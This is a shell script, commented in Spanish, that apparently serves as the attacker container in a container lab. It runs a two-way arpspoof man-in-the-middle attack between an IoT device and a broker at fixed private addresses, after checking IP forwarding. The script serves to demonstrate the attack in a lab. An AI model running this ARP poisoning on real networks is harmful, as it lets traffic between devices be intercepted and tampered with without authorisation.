#!/bin/sh
set -e

IOT_IP="172.28.0.20"
BROKER_IP="172.28.0.10"
IFACE="eth0"

echo "[attacker] esperando a que iot y broker respondan..."
until ping -c1 -W1 "$BROKER_IP" >/dev/null 2>&1; do sleep 1; done
until ping -c1 -W1 "$IOT_IP" >/dev/null 2>&1; do sleep 1; done

echo "[attacker] verificando ip_forward (debe fijarse via 'sysctls' en compose)"
if ! echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null; then
    echo "[attacker] no se pudo escribir ip_forward desde dentro (normal en Podman rootless)"
fi
VALOR_FORWARD=$(cat /proc/sys/net/ipv4/ip_forward)
echo "[attacker] net.ipv4.ip_forward = $VALOR_FORWARD"
if [ "$VALOR_FORWARD" != "1" ]; then
    echo "[attacker] AVISO: ip_forward sigue en 0. El IoT y el broker perderan conectividad real"
    echo "[attacker] mientras dure el ataque (se vera el spoofing pero no el reenvio)."
fi

cleanup() {
    echo "[attacker] deteniendo arpspoof"
    kill "$PID_A" "$PID_B" 2>/dev/null || true
    exit 0
}
trap cleanup TERM INT

echo "[attacker] iniciando doble arpspoof: $IOT_IP <-> $BROKER_IP"

# le dice al IoT que el broker es el atacante
arpspoof -i "$IFACE" -t "$IOT_IP" "$BROKER_IP" &
PID_A=$!

# le dice al broker que el IoT es el atacante
arpspoof -i "$IFACE" -t "$BROKER_IP" "$IOT_IP" &
PID_B=$!

wait "$PID_A" "$PID_B"
